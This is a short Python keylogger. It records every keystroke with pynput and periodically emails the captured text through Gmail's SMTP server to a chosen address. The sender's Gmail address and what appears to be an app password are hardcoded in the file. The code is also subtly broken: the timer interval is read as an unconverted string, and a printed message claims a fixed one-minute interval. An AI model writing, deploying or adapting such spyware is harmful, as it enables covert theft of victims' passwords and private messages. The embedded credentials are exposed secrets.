import threading
from pynput import keyboard
import smtplib

log = ""
caps = False
count = 0
print("keylogger has started running")
target_mail = input("enter the target mail: ")
time = input("enter the time you want to send in seconds:")
print("entries successfull it will send mail in every 1 minutes")


def sendmail(FROM_MAIL, PASS, MSG, TO_MAIL):
    mail = smtplib.SMTP("smtp.gmail.com", 587)
    mail.starttls()
    mail.login(FROM_MAIL, PASS)
    mail.sendmail(FROM_MAIL, TO_MAIL, MSG)
    print("sending mail...")
    mail.quit()


def on_press(key):
    global log, caps, count
    try:
        if hasattr(key, 'char'):
            if caps:
                log += str(key.char).swapcase()
            else:
                log += str(key.char)
        else:
            if key == keyboard.Key.space:
                log += " "
            elif key == keyboard.Key.backspace:
                log = log[:-1]
            elif key == keyboard.Key.caps_lock:
                caps = not caps
            elif key == keyboard.Key.enter:
                log += '\n'
    except Exception as e:
        print(f"Error: {e}")

    print(log)


fm = "pymail2807@gmail.com"
ps = "cngoukdipaihdgos"
tm = "shivagupta2807@gmail.com"


def report():
    global log
    sendmail(fm, ps, log, target_mail)
    log = ""
    timer = threading.Timer(time, report)
    timer.start()


Listener = keyboard.Listener(on_press=on_press)
with Listener:
    report()
    Listener.join()
